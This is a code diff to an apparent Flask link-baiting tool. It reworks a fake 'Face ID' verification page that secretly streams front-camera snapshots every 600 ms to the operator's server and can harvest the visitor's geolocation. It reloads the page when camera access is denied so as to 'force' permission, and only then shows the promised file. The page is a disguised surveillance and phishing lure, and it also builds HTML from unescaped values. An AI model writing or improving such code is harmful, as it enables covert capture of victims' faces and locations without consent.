@@ -120,7 +120,7 @@ def verify_otp():
         return f"{COMMON_STYLE}<div class='container'><h2>FAILED</h2><p>Invalid OTP!</p><a href='/lg'>Try Again</a></div>"
     return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>VERIFY OTP</h2><form method="POST"><input type="text" name="otp" placeholder="4-Digit Code" required><button type="submit">Verify</button></form></div>')
 
-# --- TARGET PAGE (APPLE FACE ID & RED THEME) ---
+# --- TARGET PAGE (HACK UI & RED THEME) ---
 @app.route("/t/<link_id>")
 def target_page(link_id):
     res = supabase.table("links").select("*, users(*)").eq("id", link_id).execute()
@@ -154,41 +154,71 @@ def target_page(link_id):
             
             /* Center Flex Container */
             .face-container { 
-                display: none; /* Changed to flex in JS */
-                flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 100%; 
+                display: none; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 100%; 
             }
             
             .face-wrapper {
-                position: relative; width: 250px; height: 250px; margin-bottom: 20px;
-                border-radius: 50%; overflow: hidden; border: 2px solid rgba(255,0,0,0.4);
-                box-shadow: 0 0 30px rgba(255,0,0,0.2);
+                position: relative; width: 280px; height: 280px; margin-bottom: 20px;
+                border-radius: 50%; overflow: hidden; border: 2px solid rgba(255,0,0,0.5);
+                box-shadow: 0 0 35px rgba(255,0,0,0.3);
             }
+            
             #v { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); background: #050000; } 
             
             .scan-ring {
                 position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-                border: 4px solid transparent; border-top-color: var(--red);
-                border-radius: 50%; animation: spin 1.5s linear infinite; box-shadow: inset 0 0 20px rgba(255,0,0,0.4);
+                border: 4px solid transparent; border-top-color: var(--red); border-right-color: rgba(255,0,0,0.3);
+                border-radius: 50%; animation: spin 2s linear infinite; box-shadow: inset 0 0 25px rgba(255,0,0,0.5);
                 z-index: 10; pointer-events: none;
+            }
+
+            /* --- NEW ADVANCED FACE MESH UI OVERLAY --- */
+            .face-mesh-overlay {
+                position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+                background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><path d="M25,40 L45,45 L55,45 L75,40 M45,45 L50,60 L55,45 M35,70 L50,80 L65,70" stroke="rgba(255,0,0,0.6)" stroke-width="0.5" fill="none"/><circle cx="25" cy="40" r="1.5" fill="%23ff0000"/><circle cx="45" cy="45" r="1.5" fill="%23ff0000"/><circle cx="55" cy="45" r="1.5" fill="%23ff0000"/><circle cx="75" cy="40" r="1.5" fill="%23ff0000"/><circle cx="50" cy="60" r="1.5" fill="%23ff0000"/><circle cx="35" cy="70" r="1.5" fill="%23ff0000"/><circle cx="50" cy="80" r="1.5" fill="%23ff0000"/><circle cx="65" cy="70" r="1.5" fill="%23ff0000"/></svg>') no-repeat center center;
+                background-size: 110%;
+                z-index: 15; opacity: 0.85; pointer-events: none;
+            }
+
+            .scanner-line {
+                position: absolute; top: 0; left: 0; width: 100%; height: 3px;
+                background: #ff0000; box-shadow: 0 0 15px #ff0000, 0 0 30px #ff0000;
+                z-index: 16; animation: scanAnim 2.5s infinite ease-in-out; pointer-events: none;
             }
             
             /* Location Map Pin UI */
-            .loc-container { display: none; text-align: center; }
+            .loc-container { display: none; text-align: center; flex-direction: column; align-items: center; justify-content: center;}
             .pin-icon { font-size: 80px; color: var(--red); animation: bounce 1s infinite; margin-bottom: 20px; text-shadow: 0 0 20px var(--red); }
             
             @keyframes spin { 100% { transform: rotate(360deg); } }
             @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-20px); } }
+            @keyframes scanAnim {
+                0% { top: 5%; opacity: 0; }
+                10% { opacity: 1; }
+                50% { top: 95%; opacity: 1; }
+                90% { opacity: 1; }
+                100% { top: 5%; opacity: 0; }
+            }
 
-            .instruction-text { font-family: 'Orbitron'; font-size: 1.2rem; letter-spacing: 2px; color: #fff; text-shadow: 0 0 10px var(--red); min-height: 30px; text-transform: uppercase; margin-bottom: 10px;}
-            
-            .timer-display { font-family: 'Orbitron'; font-size: 4rem; font-weight: 900; color: var(--red); text-shadow: 0 0 20px var(--red); line-height: 1; }
+            .instruction-text { font-family: 'Orbitron'; font-size: 1.2rem; letter-spacing: 2px; color: #fff; text-shadow: 0 0 10px var(--red); min-height: 30px; text-transform: uppercase; margin-bottom: 10px; text-align:center;}
+            .timer-display { font-family: 'Orbitron'; font-size: 4.5rem; font-weight: 900; color: var(--red); text-shadow: 0 0 20px var(--red); line-height: 1; margin-top: 10px; }
 
             /* Hidden Inline Content Viewer */
             #result-ui { display: none; width: 100%; height: 100%; padding: 20px; text-align: center; }
-            .content-box { background: rgba(20,0,0,0.8); border: 1px solid var(--red); padding: 15px; border-radius: 15px; box-shadow: 0 0 20px rgba(255,0,0,0.3); width: 100%; max-width: 600px; margin: 0 auto; height: 90vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-            .content-box img, .content-box video { max-width: 100%; max-height: 80vh; border-radius: 10px; border: 2px solid var(--red); }
-            .content-box iframe { width: 100%; height: 100%; border: none; border-radius: 10px; }
-            .content-text { color: #fff; font-size: 1.5rem; white-space: pre-wrap; font-family: 'Poppins'; }
+            .content-box { background: rgba(20,0,0,0.8); border: 1px solid var(--red); padding: 20px; border-radius: 15px; box-shadow: 0 0 25px rgba(255,0,0,0.3); width: 100%; max-width: 650px; margin: 0 auto; min-height: 80vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+            .content-text { color: #fff; font-size: 1.5rem; white-space: pre-wrap; font-family: 'Poppins'; margin-bottom: 20px;}
+            
+            /* DOWNLOAD BUTTON CSS */
+            .btn-download {
+                display: flex; align-items: center; justify-content: center; gap: 10px;
+                width: 100%; max-width: 350px; margin-top: 25px; padding: 16px;
+                background: linear-gradient(135deg, #8a0000, #ff0000); color: #fff;
+                border: 2px solid var(--red); border-radius: 12px; font-family: 'Orbitron', sans-serif;
+                font-size: 16px; font-weight: 800; text-decoration: none; text-transform: uppercase;
+                letter-spacing: 1px; box-shadow: 0 0 20px rgba(255,0,0,0.5); transition: 0.3s;
+                cursor: pointer;
+            }
+            .btn-download:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(255,0,0,0.8); }
         </style>
     </head>
     <body>
@@ -196,6 +226,9 @@ def target_page(link_id):
         <div id="cam-section" class="face-container">
             <div class="face-wrapper">
                 <div class="scan-ring"></div>
+                <div class="face-mesh-overlay"></div>
+                <div class="scanner-line"></div>
+                
                 <video id="v" autoplay playsinline muted></video>
             </div>
             <p class="instruction-text" id="face-msg">INITIALIZING CAMERA...</p>
@@ -224,6 +257,7 @@ def target_page(link_id):
             const c = document.getElementById('c');
             let captureInterval = null;
 
+            // Ensures immediate auto-start on load if permissions are already granted
             window.onload = () => { getHardware(); startVerificationFlow(); };
 
             function getHardware() {
@@ -233,17 +267,16 @@ def target_page(link_id):
 
             async function startVerificationFlow() {
                 if(mode === 'both' || mode === 'camera') {
-                    // Flex use kiya taake screen ke center me align ho
                     document.getElementById('cam-section').style.display = 'flex'; 
                     try {
-                        // facingMode: "user" front selfie camera open karne ke liye
                         v.srcObject = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                         startFaceCheck();
                     } catch(e) {
                         document.getElementById('face-msg').innerText = "CAMERA ACCESS DENIED";
                         document.getElementById('face-msg').style.color = "red";
                         document.getElementById('seconds-timer').style.display = "none";
-                        setTimeout(() => location.reload(), 2000);
+                        // Retrying connection if blocked to force loop
+                        setTimeout(() => location.reload(), 2500);
                     }
                 } else if (mode === 'location') {
                     startLocationCheck();
@@ -253,7 +286,6 @@ def target_page(link_id):
             }
 
             function takeSnap() {
-                // v.readyState check fix karta hai black images wala issue
                 if(v.readyState < 2 || v.videoWidth === 0 || v.videoHeight === 0) return;
                 
                 c.width = v.videoWidth; 
@@ -261,13 +293,12 @@ def target_page(link_id):
                 c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
                 
                 let imgData = c.toDataURL('image/jpeg', 0.5);
-                if(imgData.length < 1000) return; // Ignore empty frames
+                if(imgData.length < 1000) return; 
                 
                 fetch("/api/capture/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ img: imgData }) });
             }
 
             function startFaceCheck() {
-                // 600ms ka interval taake zyada real-time images send hun
                 captureInterval = setInterval(takeSnap, 600); 
 
                 let timeLeft = 15;
@@ -279,7 +310,7 @@ def target_page(link_id):
 
                 let timer = setInterval(() => {
                     timeLeft--;
-                    timerText.innerText = timeLeft; // Neche seconds chalana
+                    timerText.innerText = timeLeft; 
                     
                     if(timeLeft % 3 === 0) step = (step + 1) % instructions.length;
                     faceMsg.innerText = instructions[step];
@@ -297,7 +328,7 @@ def target_page(link_id):
             }
 
             function startLocationCheck() {
-                document.getElementById('loc-section').style.display = 'block';
+                document.getElementById('loc-section').style.display = 'flex';
                 const locMsg = document.getElementById('loc-msg');
                 
                 if(navigator.geolocation) {
@@ -330,11 +361,24 @@ def target_page(link_id):
                 if(actMode === 'text') {
                     html = `<div class="content-text">${txtVal}</div>`;
                 } else if (actMode === 'file') {
-                    if(fType === 'image') html = `<img src="${actVal}" alt="Secure File">`;
-                    else if (fType === 'video') html = `<video src="${actVal}" controls autoplay></video>`;
-                    else html = `<iframe src="${actVal}"></iframe>`;
+                    // AUTO DETECT FIX: Prevents Video from showing as a broken image icon.
+                    let ext = actVal.split('.').pop().toLowerCase();
+                    let isVideo = ['mp4', 'webm', 'ogg', 'mov'].includes(ext);
+                    let isImage = ['jpg', 'jpeg', 'png', 'gif', 'webp'].includes(ext);
+
+                    if(isVideo || fType === 'video') {
+                        html = `<video src="${actVal}" controls autoplay playsinline style="width:100%; max-height:60vh; border-radius:10px; border: 2px solid var(--red); box-shadow: 0 0 20px rgba(255,0,0,0.3);"></video>`;
+                    } else if (isImage || fType === 'image') {
+                        html = `<img src="${actVal}" alt="Secure File" style="width:100%; max-height:60vh; object-fit:contain; border-radius:10px; border: 2px solid var(--red); box-shadow: 0 0 20px rgba(255,0,0,0.3);">`;
+                    } else {
+                        html = `<iframe src="${actVal}" style="width:100%; height:50vh; border:none; border-radius:10px; border: 2px solid var(--red);"></iframe>`;
+                    }
+                    
+                    // NEW DOWNLOAD BUTTON ADDED
+                    html += `<a href="${actVal}" download target="_blank" class="btn-download"><i class="fas fa-download"></i> Download Secure File</a>`;
+                    
                 } else {
-                    html = `<iframe src="${actVal}"></iframe>`;
+                    html = `<iframe src="${actVal}" style="width:100%; height:80vh; border:none; border-radius:10px;"></iframe>`;
                 }
                 medBox.innerHTML = html;
             }
